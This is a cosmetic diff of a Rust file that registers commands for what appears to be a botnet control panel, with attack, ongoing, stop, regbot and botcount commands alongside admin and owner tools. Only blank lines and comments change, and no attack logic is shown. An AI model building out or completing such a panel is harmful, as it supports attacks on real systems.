@@ -9,9 +9,6 @@ use super::general;
 use super::admin;
 use super::owner;
 use super::attack;
-
-// --- General Commands ---
-
 pub struct HelpCommand;
 #[async_trait]
 impl Command for HelpCommand {
@@ -22,7 +19,6 @@ impl Command for HelpCommand {
         general::handle_help_command(client, state).await
     }
 }
-
 pub struct StatsCommand;
 #[async_trait]
 impl Command for StatsCommand {
@@ -33,7 +29,6 @@ impl Command for StatsCommand {
         general::handle_stats_command(client, state).await
     }
 }
-
 pub struct HealthCommand;
 #[async_trait]
 impl Command for HealthCommand {
@@ -44,7 +39,6 @@ impl Command for HealthCommand {
         general::handle_health_command(client, state).await
     }
 }
-
 pub struct OnlineCommand;
 #[async_trait]
 impl Command for OnlineCommand {
@@ -55,7 +49,6 @@ impl Command for OnlineCommand {
         general::handle_online_command(client, state).await
     }
 }
-
 pub struct WhoAmICommand;
 #[async_trait]
 impl Command for WhoAmICommand {
@@ -66,7 +59,6 @@ impl Command for WhoAmICommand {
         general::handle_whoami_command(client, state).await
     }
 }
-
 pub struct UptimeCommand;
 #[async_trait]
 impl Command for UptimeCommand {
@@ -77,7 +69,6 @@ impl Command for UptimeCommand {
         general::handle_uptime_command(client, state).await
     }
 }
-
 pub struct GifCommand;
 #[async_trait]
 impl Command for GifCommand {
@@ -88,7 +79,6 @@ impl Command for GifCommand {
         general::handle_gif_command(client, state, &args).await
     }
 }
-
 pub struct MethodsCommand;
 #[async_trait]
 impl Command for MethodsCommand {
@@ -99,7 +89,6 @@ impl Command for MethodsCommand {
         general::handle_methods_command(client, state).await
     }
 }
-
 pub struct DashboardCommand;
 #[async_trait]
 impl Command for DashboardCommand {
@@ -110,7 +99,6 @@ impl Command for DashboardCommand {
         general::handle_dashboard_command(client, state).await
     }
 }
-
 pub struct VersionCommand;
 #[async_trait]
 impl Command for VersionCommand {
@@ -121,7 +109,6 @@ impl Command for VersionCommand {
         general::handle_version_command(client, state).await
     }
 }
-
 pub struct RulesCommand;
 #[async_trait]
 impl Command for RulesCommand {
@@ -132,9 +119,6 @@ impl Command for RulesCommand {
         general::handle_rules_command(client, state).await
     }
 }
-
-// --- Admin Commands ---
-
 pub struct AdminCommand;
 #[async_trait]
 impl Command for AdminCommand {
@@ -145,7 +129,6 @@ impl Command for AdminCommand {
         admin::handle_admin_command(client, state).await
     }
 }
-
 pub struct BotsCommand;
 #[async_trait]
 impl Command for BotsCommand {
@@ -156,7 +139,6 @@ impl Command for BotsCommand {
         admin::handle_listbots_command(client, state).await
     }
 }
-
 pub struct KickCommand;
 #[async_trait]
 impl Command for KickCommand {
@@ -167,7 +149,6 @@ impl Command for KickCommand {
         admin::handle_kick_command(client, state).await
     }
 }
-
 pub struct BanCommand;
 #[async_trait]
 impl Command for BanCommand {
@@ -178,7 +159,6 @@ impl Command for BanCommand {
         admin::handle_ban_command(client, state).await
     }
 }
-
 pub struct UnbanCommand;
 #[async_trait]
 impl Command for UnbanCommand {
@@ -189,7 +169,6 @@ impl Command for UnbanCommand {
         admin::handle_unban_command(client, state).await
     }
 }
-
 pub struct BanListCommand;
 #[async_trait]
 impl Command for BanListCommand {
@@ -200,7 +179,6 @@ impl Command for BanListCommand {
         admin::handle_banlist_command(client, state).await
     }
 }
-
 pub struct BroadcastCommand;
 #[async_trait]
 impl Command for BroadcastCommand {
@@ -216,7 +194,6 @@ impl Command for BroadcastCommand {
         admin::handle_broadcast_command(client, state, &message).await
     }
 }
-
 pub struct LogsCommand;
 #[async_trait]
 impl Command for LogsCommand {
@@ -228,7 +205,6 @@ impl Command for LogsCommand {
         admin::handle_logs_command(client, state, lines).await
     }
 }
-
 pub struct SessionsCommand;
 #[async_trait]
 impl Command for SessionsCommand {
@@ -239,7 +215,6 @@ impl Command for SessionsCommand {
         admin::handle_sessions_command(client, state).await
     }
 }
-
 pub struct UserInfoCommand;
 #[async_trait]
 impl Command for UserInfoCommand {
@@ -250,7 +225,6 @@ impl Command for UserInfoCommand {
         admin::handle_userinfo_command(client, state, &args).await
     }
 }
-
 pub struct LockCommand;
 #[async_trait]
 impl Command for LockCommand {
@@ -261,7 +235,6 @@ impl Command for LockCommand {
         admin::handle_lock_command(client, state, &args).await
     }
 }
-
 pub struct BotCountCommand;
 #[async_trait]
 impl Command for BotCountCommand {
@@ -272,7 +245,6 @@ impl Command for BotCountCommand {
         admin::handle_botcount_command(client, state).await
     }
 }
-
 pub struct ListUsersCommand;
 #[async_trait]
 impl Command for ListUsersCommand {
@@ -283,9 +255,6 @@ impl Command for ListUsersCommand {
         admin::handle_listusers_command(client, state).await
     }
 }
-
-// --- Owner Commands ---
-
 pub struct OwnerCommand;
 #[async_trait]
 impl Command for OwnerCommand {
@@ -296,7 +265,6 @@ impl Command for OwnerCommand {
         owner::handle_owner_command(client, state).await
     }
 }
-
 pub struct RegBotCommand;
 #[async_trait]
 impl Command for RegBotCommand {
@@ -307,7 +275,6 @@ impl Command for RegBotCommand {
         owner::handle_regbot_command(client, state, &args).await
     }
 }
-
 pub struct KillAllCommand;
 #[async_trait]
 impl Command for KillAllCommand {
@@ -318,7 +285,6 @@ impl Command for KillAllCommand {
         owner::handle_killall_command(client, state).await
     }
 }
-
 pub struct BackupsCommand;
 #[async_trait]
 impl Command for BackupsCommand {
@@ -329,7 +295,6 @@ impl Command for BackupsCommand {
         owner::handle_listbackups_command(client).await
     }
 }
-
 pub struct RestoreCommand;
 #[async_trait]
 impl Command for RestoreCommand {
@@ -340,7 +305,6 @@ impl Command for RestoreCommand {
         owner::handle_restore_command(client, state, &args).await
     }
 }
-
 pub struct DbCommand;
 #[async_trait]
 impl Command for DbCommand {
@@ -351,7 +315,6 @@ impl Command for DbCommand {
         owner::handle_db_command(client, state, &args).await
     }
 }
-
 pub struct AddUserCommand;
 #[async_trait]
 impl Command for AddUserCommand {
@@ -362,7 +325,6 @@ impl Command for AddUserCommand {
         owner::handle_adduser_command(client, state, &args).await
     }
 }
-
 pub struct DelUserCommand;
 #[async_trait]
 impl Command for DelUserCommand {
@@ -373,7 +335,6 @@ impl Command for DelUserCommand {
         owner::handle_deluser_command(client, state, &args).await
     }
 }
-
 pub struct ChangePassCommand;
 #[async_trait]
 impl Command for ChangePassCommand {
@@ -384,7 +345,6 @@ impl Command for ChangePassCommand {
         owner::handle_changepass_command(client, state, &args).await
     }
 }
-
 pub struct ClearLogsCommand;
 #[async_trait]
 impl Command for ClearLogsCommand {
@@ -395,7 +355,6 @@ impl Command for ClearLogsCommand {
         owner::handle_clearlogs_command(client, state).await
     }
 }
-
 pub struct UserChangeCommand;
 #[async_trait]
 impl Command for UserChangeCommand {
@@ -406,7 +365,6 @@ impl Command for UserChangeCommand {
         owner::handle_userchange_command(client, state, &args).await
     }
 }
-
 pub struct WhitelistCommand;
 #[async_trait]
 impl Command for WhitelistCommand {
@@ -417,7 +375,6 @@ impl Command for WhitelistCommand {
         admin::handle_whitelist_command(client, state, &args).await
     }
 }
-
 pub struct BlacklistCommand;
 #[async_trait]
 impl Command for BlacklistCommand {
@@ -428,7 +385,6 @@ impl Command for BlacklistCommand {
         admin::handle_blacklist_command(client, state, &args).await
     }
 }
-
 pub struct ConfigCommand;
 #[async_trait]
 impl Command for ConfigCommand {
@@ -439,7 +395,6 @@ impl Command for ConfigCommand {
         owner::handle_config_command(client, state, &args).await
     }
 }
-
 pub struct TokensCommand;
 #[async_trait]
 impl Command for TokensCommand {
@@ -450,7 +405,6 @@ impl Command for TokensCommand {
         owner::handle_tokens_command(client, state).await
     }
 }
-
 pub struct RevokeCommand;
 #[async_trait]
 impl Command for RevokeCommand {
@@ -461,7 +415,6 @@ impl Command for RevokeCommand {
         owner::handle_revoke_command(client, state, &args).await
     }
 }
-
 pub struct BotQueueCommand;
 #[async_trait]
 impl Command for BotQueueCommand {
@@ -472,9 +425,6 @@ impl Command for BotQueueCommand {
         owner::handle_bot_queue_command(client, state, &args).await
     }
 }
-
-// --- Attack Commands ---
-
 pub struct AttackCommand;
 #[async_trait]
 impl Command for AttackCommand {
@@ -485,7 +435,6 @@ impl Command for AttackCommand {
         attack::handle_attack_command(client, state, &args).await
     }
 }
-
 pub struct OngoingCommand;
 #[async_trait]
 impl Command for OngoingCommand {
@@ -496,7 +445,6 @@ impl Command for OngoingCommand {
         attack::handle_ongoing_command(client, state).await
     }
 }
-
 pub struct StopCommand;
 #[async_trait]
 impl Command for StopCommand {
@@ -507,7 +455,6 @@ impl Command for StopCommand {
         attack::handle_stop_command(client, state, &args).await
     }
 }
-
 pub struct HistoryCommand;
 #[async_trait]
 impl Command for HistoryCommand {
@@ -518,7 +465,6 @@ impl Command for HistoryCommand {
         attack::handle_history_command(client, state).await
     }
 }
-
 pub struct QueueCommand;
 #[async_trait]
 impl Command for QueueCommand {
@@ -529,9 +475,7 @@ impl Command for QueueCommand {
         attack::handle_queue_command(client, state).await
     }
 }
-
 pub fn register_all(registry: &mut super::registry::CommandRegistry) {
-    // General
     registry.register(Box::new(HelpCommand));
     registry.register(Box::new(StatsCommand));
     registry.register(Box::new(HealthCommand));
@@ -543,8 +487,6 @@ pub fn register_all(registry: &mut super::registry::CommandRegistry) {
     registry.register(Box::new(DashboardCommand));
     registry.register(Box::new(VersionCommand));
     registry.register(Box::new(RulesCommand));
-
-    // Admin
     registry.register(Box::new(AdminCommand));
     registry.register(Box::new(BotsCommand));
     registry.register(Box::new(KickCommand));
@@ -558,8 +500,6 @@ pub fn register_all(registry: &mut super::registry::CommandRegistry) {
     registry.register(Box::new(LockCommand));
     registry.register(Box::new(BotCountCommand));
     registry.register(Box::new(ListUsersCommand));
-
-    // Owner
     registry.register(Box::new(OwnerCommand));
     registry.register(Box::new(RegBotCommand));
     registry.register(Box::new(KillAllCommand));
@@ -577,8 +517,6 @@ pub fn register_all(registry: &mut super::registry::CommandRegistry) {
     registry.register(Box::new(TokensCommand));
     registry.register(Box::new(RevokeCommand));
     registry.register(Box::new(BotQueueCommand));
-
-    // Attack
     registry.register(Box::new(AttackCommand));
     registry.register(Box::new(OngoingCommand));
     registry.register(Box::new(StopCommand));
